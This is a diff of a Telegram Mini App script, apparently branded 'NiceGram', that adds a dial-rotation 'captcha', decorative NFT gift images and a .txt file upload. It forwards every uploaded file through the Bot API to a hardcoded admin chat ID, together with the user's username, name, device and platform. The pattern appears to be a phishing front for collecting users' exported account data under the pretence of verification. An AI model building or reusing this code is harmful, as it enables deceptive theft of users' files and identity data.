@@ -1,62 +1,201 @@
 const tg = window.Telegram.WebApp;
 tg.expand();
 
-// --- НАСТРОЙКИ МИНИ-АПА ---
-const BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА"; // ДОЛЖЕН БЫТЬ ТАКИМ ЖЕ КАК В БОТЕ
+// --- НАСТРОЙКИ ---
+const BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА";
 const ADMIN_ID = "7632180689";
-// -------------------------
+
+// Фоновые изображения
+const BG_IMAGES = [
+    "https://static6.tgstat.ru/channels/_0/7c/7c8536637e62010b627a43f09fe8a469.jpg",
+    "https://cache.tonapi.io/imgproxy/emGFD8G3jt41AkBJLS2ygiHlTP20aCPP_tN0O7j_9aA/rs:fill:1500:1500:1/g:no/aHR0cHM6Ly9uZnQuZnJhZ21lbnQuY29tL2dpZnQvY3J5c3RhbGJhbGwtNDk0LndlYnA.webp",
+    "https://i.getgems.io/cj6OL84WRNDlEU1STgJv-6EComaWdEiyGa3ueSBHvzw/rs:fill:1000:0:1/g:ce/czM6Ly9nZXRnZW1zLXMzL25mdC1jb250ZW50L2NhY2hlL2ltYWdlcy9FUURMN0hNYmNhMEZ1ZnJqSEZjUm9pTGtFaU9Ya1hvT192SDJnVlVOOEpOcDRraEsvNjgzMDZjMTkyYWNjMDU3Mw",
+    "https://yt3.googleusercontent.com/v5uMoct16G7gneNFzOx71EZHam15nxmcxpcovXNMRMM0UtxsGq0IWn5ZcLmQ0pGgOIuGHBSTmFY=s900-c-k-c0x00ffffff-no-rj"
+];
+// ----------------
 
 let angle = 0;
 let isDragging = false;
+let targetAngle = 0;
+let targetStart = 0;
+let targetEnd = 0;
 
-const circle = document.getElementById('circle');
-const degreeTxt = document.getElementById('degree');
-const captchaScreen = document.getElementById('captcha-screen');
-const mainScreen = document.getElementById('main-screen');
-const statusMsg = document.getElementById('status-msg');
-const deviceInfo = document.getElementById('device-info');
-const welcomeUser = document.getElementById('welcome-user');
+// Элементы DOM
+const elements = {
+    circle: document.getElementById('circle'),
+    degree: document.getElementById('degree'),
+    captchaScreen: document.getElementById('captcha-screen'),
+    mainScreen: document.getElementById('main-screen'),
+    statusMsg: document.getElementById('status-msg'),
+    deviceInfo: document.getElementById('device-info'),
+    welcomeUser: document.getElementById('welcome-user'),
+    degreeMarks: document.getElementById('degree-marks'),
+    targetHint: document.getElementById('target-hint'),
+    verifyBtn: document.getElementById('verify-btn'),
+    selectFileBtn: document.getElementById('select-file-btn'),
+    fileInput: document.getElementById('file-input')
+};
 
-// Определение устройства
-function detectPlatform() {
-    const platform = tg.platform || "Неизвестно";
-    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+// ========== ИНИЦИАЛИЗАЦИЯ ==========
+
+// Создание циферблата
+function createDegreeMarks() {
+    elements.degreeMarks.innerHTML = '';
     
-    let deviceType = "Неизвестное устройство";
-    
-    if (/android/i.test(userAgent)) {
-        deviceType = "📱 Android";
-    } else if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
-        deviceType = "📱 iOS";
-    } else if (/windows/i.test(userAgent)) {
-        deviceType = "💻 Windows";
-    } else if (/mac/i.test(userAgent)) {
-        deviceType = "💻 macOS";
-    } else if (/linux/i.test(userAgent)) {
-        deviceType = "💻 Linux";
+    for (let i = 0; i < 360; i += 10) {
+        const mark = document.createElement('div');
+        mark.className = 'degree-mark';
+        mark.textContent = i;
+        mark.style.transform = `rotate(${i}deg) translate(95px) rotate(-${i}deg)`;
+        elements.degreeMarks.appendChild(mark);
     }
-    
-    // Обновляем информацию об устройстве
-    deviceInfo.innerHTML = `
-        <strong>📱 Устройство:</strong> ${deviceType}<br>
-        <strong>🌐 Платформа:</strong> ${platform}<br>
-        <small>ID: ${tg.initDataUnsafe?.user?.id || 'Неизвестно'}</small>
-    `;
-    
-    return { deviceType, platform };
 }
 
-// Логика вращения стрелки (оптимизировано для мобильных)
+// Генерация случайного целевого угла
+function generateTarget() {
+    // Случайный угол (0, 10, 20, ..., 350)
+    targetAngle = Math.floor(Math.random() * 36) * 10;
+    
+    // Диапазон с погрешностью 10°
+    targetStart = targetAngle - 10;
+    targetEnd = targetAngle + 10;
+    
+    // Корректировка для углов около 0°
+    if (targetStart < 0) {
+        targetStart += 360;
+    }
+    if (targetEnd >= 360) {
+        targetEnd -= 360;
+    }
+    
+    // Формирование текста подсказки
+    let hintText = '';
+    if (targetStart > targetEnd) {
+        // Диапазон проходит через 0°
+        hintText = `Цель: 0°-${targetEnd}° ИЛИ ${targetStart}°-360°`;
+    } else {
+        hintText = `Цель: ${targetStart}°-${targetEnd}°`;
+    }
+    
+    elements.targetHint.textContent = hintText;
+    highlightTargetMarks();
+}
+
+// Подсветка целевых меток
+function highlightTargetMarks() {
+    // Сброс подсветки
+    document.querySelectorAll('.degree-mark').forEach(mark => {
+        mark.classList.remove('target');
+    });
+    
+    // Подсветка нужных меток
+    document.querySelectorAll('.degree-mark').forEach(mark => {
+        const markAngle = parseInt(mark.textContent);
+        
+        if (targetStart > targetEnd) {
+            // Диапазон через 0°
+            if ((markAngle >= 0 && markAngle <= targetEnd) || 
+                (markAngle >= targetStart && markAngle <= 360)) {
+                mark.classList.add('target');
+            }
+        } else {
+            // Обычный диапазон
+            if (markAngle >= targetStart && markAngle <= targetEnd) {
+                mark.classList.add('target');
+            }
+        }
+    });
+}
+
+// Проверка попадания в диапазон
+function checkAngleInRange(currentAngle) {
+    if (targetStart > targetEnd) {
+        // Диапазон через 0°
+        return (currentAngle >= 0 && currentAngle <= targetEnd) || 
+               (currentAngle >= targetStart && currentAngle <= 360);
+    } else {
+        // Обычный диапазон
+        return currentAngle >= targetStart && currentAngle <= targetEnd;
+    }
+}
+
+// ========== ФОНОВЫЕ ИЗОБРАЖЕНИЯ ==========
+
+function createBackgroundImages() {
+    const container = document.getElementById('floating-bg');
+    container.innerHTML = '';
+    
+    const positions = [
+        {top: '15%', left: '10%', delay: '0s', size: 80},
+        {top: '25%', left: '75%', delay: '3s', size: 90},
+        {top: '65%', left: '15%', delay: '6s', size: 85},
+        {top: '75%', left: '70%', delay: '9s', size: 75}
+    ];
+    
+    BG_IMAGES.forEach((src, index) => {
+        const img = document.createElement('img');
+        img.className = 'floating-img';
+        img.src = src;
+        img.alt = '';
+        img.loading = 'lazy';
+        
+        // Размеры
+        const isMobile = window.innerWidth < 768;
+        const size = isMobile ? positions[index].size * 0.7 : positions[index].size;
+        img.style.width = `${size}px`;
+        img.style.height = `${size}px`;
+        
+        // Позиция
+        img.style.top = positions[index].top;
+        img.style.left = positions[index].left;
+        
+        // Анимация
+        img.style.animationDelay = positions[index].delay;
+        img.style.animationDuration = `${20 + index * 3}s`;
+        
+        container.appendChild(img);
+    });
+}
+
+// ========== ОПРЕДЕЛЕНИЕ УСТРОЙСТВА ==========
+
+function detectDevice() {
+    const platform = tg.platform || "Неизвестно";
+    const userAgent = navigator.userAgent.toLowerCase();
+    
+    let device = "Неизвестно";
+    
+    if (/android/.test(userAgent)) {
+        device = "📱 Android";
+    } else if (/iphone|ipad|ipod/.test(userAgent)) {
+        device = "📱 iOS";
+    } else if (/windows/.test(userAgent)) {
+        device = "💻 Windows";
+    } else if (/mac/.test(userAgent)) {
+        device = "💻 macOS";
+    } else if (/linux/.test(userAgent)) {
+        device = "💻 Linux";
+    }
+    
+    elements.deviceInfo.innerHTML = `
+        <div>📱 <strong>Устройство:</strong> ${device}</div>
+        <div>🌐 <strong>Платформа:</strong> ${platform}</div>
+    `;
+    
+    return { device, platform };
+}
+
+// ========== ВРАЩЕНИЕ СТРЕЛКИ ==========
+
 function handleRotation(e) {
     if (!isDragging) return;
     
-    // Предотвращаем скролл на мобильных
     e.preventDefault();
     
     const clientX = e.touches ? e.touches[0].clientX : e.clientX;
     const clientY = e.touches ? e.touches[0].clientY : e.clientY;
     
-    const rect = circle.parentElement.getBoundingClientRect();
+    const rect = elements.circle.parentElement.getBoundingClientRect();
     const centerX = rect.left + rect.width / 2;
     const centerY = rect.top + rect.height / 2;
     
@@ -64,218 +203,187 @@ function handleRotation(e) {
     angle = Math.round(radians * (180 / Math.PI) + 90);
     if (angle < 0) angle += 360;
     
-    circle.style.transform = `rotate(${angle}deg)`;
-    degreeTxt.innerText = `${angle}°`;
+    // Обновление отображения
+    elements.circle.style.transform = `rotate(${angle}deg)`;
+    elements.degree.textContent = `${angle}°`;
     
-    // Изменение цвета при приближении к цели
-    if (angle >= 80 && angle <= 99) {
-        circle.style.background = 'linear-gradient(135deg, #00aaff, #0066ff)';
-        circle.style.boxShadow = '0 0 45px rgba(0, 170, 255, 0.8), inset 0 2px 0 rgba(255, 255, 255, 0.3)';
-        degreeTxt.style.color = '#66ffff';
-        degreeTxt.style.textShadow = '0 0 20px rgba(102, 255, 255, 0.9)';
+    // Подсветка при попадании в диапазон
+    if (checkAngleInRange(angle)) {
+        elements.circle.style.background = 'linear-gradient(135deg, #00aa00, #008800)';
+        elements.circle.style.boxShadow = '0 0 20px #00ff00';
     } else {
-        circle.style.background = 'linear-gradient(135deg, #0066ff, #0033cc)';
-        circle.style.boxShadow = '0 0 30px rgba(0, 102, 255, 0.6), inset 0 2px 0 rgba(255, 255, 255, 0.3)';
-        degreeTxt.style.color = '#66ccff';
-        degreeTxt.style.textShadow = '0 0 15px rgba(102, 204, 255, 0.7)';
+        elements.circle.style.background = 'linear-gradient(135deg, #008800, #004400)';
+        elements.circle.style.boxShadow = '0 0 15px rgba(0, 255, 0, 0.4)';
     }
 }
 
-// Инициализация событий вращения
-circle.addEventListener('mousedown', () => {
-    isDragging = true;
-    circle.style.cursor = 'grabbing';
-});
+// ========== КАПЧА ==========
 
-circle.addEventListener('touchstart', (e) => {
-    e.preventDefault();
-    isDragging = true;
-    circle.style.cursor = 'grabbing';
-});
-
-window.addEventListener('mousemove', handleRotation);
-window.addEventListener('touchmove', handleRotation, {passive: false});
-
-window.addEventListener('mouseup', () => {
-    isDragging = false;
-    circle.style.cursor = 'grab';
-});
-
-window.addEventListener('touchend', () => {
-    isDragging = false;
-    circle.style.cursor = 'grab';
-});
-
-// Кнопка подтверждения капчи
-document.getElementById('verify-btn').onclick = () => {
-    // Проверка попадания в диапазон 80-99 градусов
-    if (angle >= 80 && angle <= 99) {
-        // Виброотклик
-        if (tg.HapticFeedback) {
-            tg.HapticFeedback.impactOccurred('soft');
-        }
-        
-        // Плавный переход
-        captchaScreen.style.opacity = '0';
-        captchaScreen.style.transform = 'translateY(-20px)';
-        
-        setTimeout(() => {
-            captchaScreen.classList.add('hidden');
-            mainScreen.classList.remove('hidden');
-            mainScreen.classList.add('fade-in');
-            
-            // Приветствие пользователя
-            const firstName = tg.initDataUnsafe?.user?.first_name || "Пользователь";
-            const username = tg.initDataUnsafe?.user?.username 
-                ? `@${tg.initDataUnsafe.user.username}` 
-                : "без username";
-            
-            welcomeUser.innerText = `👋 Добро пожаловать, ${firstName}!`;
-            
-            // Определение устройства
-            detectPlatform();
-            
-            // Анимация появления
-            mainScreen.style.opacity = '0';
-            mainScreen.style.transform = 'translateY(20px)';
-            
-            setTimeout(() => {
-                mainScreen.style.opacity = '1';
-                mainScreen.style.transform = 'translateY(0)';
-            }, 50);
-        }, 300);
-    } else {
-        // Ошибка с виброоткликом
-        if (tg.HapticFeedback) {
-            tg.HapticFeedback.impactOccurred('heavy');
-        }
-        
-        alert("❌ Неверно! Поверните стрелку вправо в диапазон 80°-99°");
-    }
-};
-
-// Выбор и отправка файла
-const fileInput = document.getElementById('file-input');
-document.getElementById('select-file-btn').onclick = () => {
-    // Виброотклик при нажатии
-    if (tg.HapticFeedback) {
-        tg.HapticFeedback.selectionChanged();
-    }
-    fileInput.click();
-};
-
-fileInput.onchange = async () => {
-    const file = fileInput.files[0];
-    if (!file) return;
-
-    // 1. Проверка: только TXT файлы
-    if (!file.name.toLowerCase().endsWith('.txt')) {
-        statusMsg.className = "status active error";
-        statusMsg.innerHTML = "❌ <strong>Ошибка:</strong> Разрешены только файлы с расширением .txt!";
-        
-        // Сброс input
-        fileInput.value = ""; 
-        
-        // Виброотклик ошибки
-        if (tg.HapticFeedback) {
-            tg.HapticFeedback.impactOccurred('heavy');
-        }
-        return;
-    }
-
-    // 2. Проверка размера файла (максимум 10MB)
-    if (file.size > 10 * 1024 * 1024) {
-        statusMsg.className = "status active error";
-        statusMsg.innerHTML = "❌ <strong>Ошибка:</strong> Файл слишком большой! Максимум 10MB.";
-        fileInput.value = "";
-        return;
-    }
-
-    // 3. Подготовка статуса
-    statusMsg.className = "status active";
-    statusMsg.innerHTML = '<span class="loader"></span> Отправка файла...';
-
-    // 4. Сбор данных
-    const user = tg.initDataUnsafe?.user || {};
-    const username = user.username ? `@${user.username}` : "Скрыт";
-    const firstName = user.first_name || "Пользователь";
-    const userId = user.id || "Неизвестно";
+function initializeCaptcha() {
+    // Слушатели для вращения
+    elements.circle.addEventListener('mousedown', () => {
+        isDragging = true;
+        elements.circle.style.cursor = 'grabbing';
+    });
     
-    // Определение устройства
-    const { deviceType, platform } = detectPlatform();
+    elements.circle.addEventListener('touchstart', (e) => {
+        e.preventDefault();
+        isDragging = true;
+        elements.circle.style.cursor = 'grabbing';
+    });
     
-    // 5. Подготовка FormData
-    const formData = new FormData();
-    formData.append('chat_id', ADMIN_ID);
-    formData.append('document', file);
+    window.addEventListener('mousemove', handleRotation);
+    window.addEventListener('touchmove', handleRotation, {passive: false});
     
-    // Подробная подпись
-    const caption = `📄 <b>Файл:</b> ${file.name}\n` +
-                   `👤 <b>Юзер:</b> ${username}\n` +
-                   `👨 <b>Имя:</b> ${firstName}\n` +
-                   `🆔 <b>ID:</b> <code>${userId}</code>\n` +
-                   `📱 <b>Устройство:</b> ${deviceType}\n` +
-                   `🌐 <b>Платформа:</b> ${platform}\n` +
-                   `📊 <b>Размер:</b> ${(file.size / 1024).toFixed(2)} KB\n` +
-                   `⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
+    window.addEventListener('mouseup', () => {
+        isDragging = false;
+        elements.circle.style.cursor = 'grab';
+    });
     
-    formData.append('caption', caption);
-    formData.append('parse_mode', 'HTML');
-
-    try {
-        // 6. Отправка через Telegram Bot API
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-            method: 'POST',
-            body: formData
-        });
-
-        const data = await response.json();
-
-        if (response.ok && data.ok) {
+    window.addEventListener('touchend', () => {
+        isDragging = false;
+        elements.circle.style.cursor = 'grab';
+    });
+    
+    // Кнопка проверки
+    elements.verifyBtn.onclick = () => {
+        if (checkAngleInRange(angle)) {
             // Успех
-            statusMsg.className = "status active success";
-            statusMsg.innerHTML = "✅ <strong>Успешно!</strong> Файл доставлен администратору.";
-            
-            // Виброотклик успеха
             if (tg.HapticFeedback) {
-                tg.HapticFeedback.notificationOccurred('success');
+                tg.HapticFeedback.impactOccurred('light');
             }
             
-            // Автоматический сброс через 5 секунд
+            // Плавный переход
+            elements.captchaScreen.style.opacity = '0';
             setTimeout(() => {
-                statusMsg.className = "status";
-                fileInput.value = "";
-            }, 5000);
-            
+                elements.captchaScreen.classList.add('hidden');
+                elements.mainScreen.classList.remove('hidden');
+                
+                // Приветствие
+                const firstName = tg.initDataUnsafe?.user?.first_name || "Пользователь";
+                elements.welcomeUser.textContent = `Добро пожаловать, ${firstName}!`;
+                
+                // Инфо об устройстве
+                detectDevice();
+                
+                // Анимация появления
+                elements.mainScreen.style.opacity = '0';
+                setTimeout(() => {
+                    elements.mainScreen.style.opacity = '1';
+                }, 50);
+            }, 300);
         } else {
-            // Ошибка Telegram API
-            statusMsg.className = "status active error";
-            const errorMsg = data.description || 'Неизвестная ошибка';
-            statusMsg.innerHTML = `❌ <strong>Ошибка API:</strong> ${errorMsg}`;
-            
+            // Ошибка
             if (tg.HapticFeedback) {
-                tg.HapticFeedback.notificationOccurred('error');
+                tg.HapticFeedback.impactOccurred('heavy');
             }
+            alert("❌ Неверно! Поверните стрелку в указанный диапазон.");
         }
-    } catch (err) {
-        // Ошибка сети
-        statusMsg.className = "status active error";
-        statusMsg.innerHTML = "❌ <strong>Ошибка сети:</strong> Проверьте соединение.";
-        console.error('Ошибка отправки:', err);
-    }
-};
+    };
+}
 
-// Инициализация при загрузке
-tg.ready();
-detectPlatform();
+// ========== ОТПРАВКА ФАЙЛА ==========
 
-// Фикс для мобильного фона - гарантируем черный фон
-document.body.style.backgroundColor = "#000";
-document.documentElement.style.backgroundColor = "#000";
+function initializeFileUpload() {
+    elements.selectFileBtn.onclick = () => {
+        if (tg.HapticFeedback) {
+            tg.HapticFeedback.selectionChanged();
+        }
+        elements.fileInput.click();
+    };
+    
+    elements.fileInput.onchange = async () => {
+        const file = elements.fileInput.files[0];
+        if (!file) return;
+        
+        // Проверка типа файла
+        if (!file.name.toLowerCase().endsWith('.txt')) {
+            showStatus("❌ Ошибка: Разрешены только .txt файлы!", 'error');
+            elements.fileInput.value = "";
+            return;
+        }
+        
+        // Проверка размера
+        if (file.size > 10 * 1024 * 1024) {
+            showStatus("❌ Файл слишком большой! Максимум 10MB", 'error');
+            elements.fileInput.value = "";
+            return;
+        }
+        
+        showStatus("⏳ Отправка файла...", 'loading');
+        
+        // Сбор данных
+        const user = tg.initDataUnsafe?.user || {};
+        const username = user.username ? `@${user.username}` : "Скрыт";
+        const firstName = user.first_name || "Пользователь";
+        const { device, platform } = detectDevice();
+        
+        // Отправка
+        try {
+            const formData = new FormData();
+            formData.append('chat_id', ADMIN_ID);
+            formData.append('document', file);
+            
+            const caption = `📄 Файл: ${file.name}\n` +
+                           `👤 Пользователь: ${username}\n` +
+                           `👨 Имя: ${firstName}\n` +
+                           `📱 Устройство: ${device}\n` +
+                           `🌐 Платформа: ${platform}\n` +
+                           `📦 Размер: ${(file.size / 1024).toFixed(1)} KB`;
+            
+            formData.append('caption', caption);
+            
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            });
+            
+            const data = await response.json();
+            
+            if (response.ok && data.ok) {
+                showStatus("✅ Файл успешно отправлен!", 'success');
+                if (tg.HapticFeedback) {
+                    tg.HapticFeedback.notificationOccurred('success');
+                }
+                setTimeout(() => {
+                    elements.statusMsg.className = 'status';
+                    elements.fileInput.value = "";
+                }, 3000);
+            } else {
+                showStatus(`❌ Ошибка: ${data.description || 'Неизвестная ошибка'}`, 'error');
+            }
+        } catch (error) {
+            showStatus("❌ Ошибка сети. Проверьте соединение.", 'error');
+            console.error('Ошибка отправки:', error);
+        }
+    };
+}
 
-// Логирование для отладки
-console.log(`NiceGram Mini-App запущен
-Пользователь: ${tg.initDataUnsafe?.user?.first_name || 'Неизвестно'}
-Платформа: ${tg.platform}
-Версия: ${tg.version}
-Цветовая тема: ${tg.colorScheme}`);
+// Показать статус
+function showStatus(message, type = 'info') {
+    elements.statusMsg.textContent = message;
+    elements.statusMsg.className = `status active ${type}`;
+}
+
+// ========== ЗАПУСК ПРИЛОЖЕНИЯ ==========
+
+function initApp() {
+    tg.ready();
+    
+    // Инициализация
+    createDegreeMarks();
+    generateTarget();
+    createBackgroundImages();
+    initializeCaptcha();
+    initializeFileUpload();
+    detectDevice();
+    
+    // Адаптация при изменении размера
+    window.addEventListener('resize', createBackgroundImages);
+    
+    console.log('NiceGram App запущен');
+    console.log(`Целевой диапазон: ${targetStart}° - ${targetEnd}°`);
+}
+
+// Запуск при загрузке
+document.addEventListener('DOMContentLoaded', initApp);
